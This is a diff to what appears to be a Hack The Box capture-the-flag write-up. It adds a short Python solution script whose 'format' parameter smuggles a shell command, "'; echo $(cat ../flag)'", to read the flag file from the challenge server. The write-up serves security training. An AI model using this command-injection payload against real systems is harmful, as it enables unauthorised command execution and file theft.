@@ -50,4 +50,16 @@ From the DockerFile we can see the flag location :
 COPY flag /flag
 ```
 
+Solution : 
+
+```py
+from requests import *
+import re
+url="http://83.136.250.225:33938/"
+
+pattern = r'HTB\{.*\}'
+r=get(url,params={"format":"'; echo $(cat ../flag)'"})
+flag = re.findall(pattern, r.text)
+print(flag)
+```
 
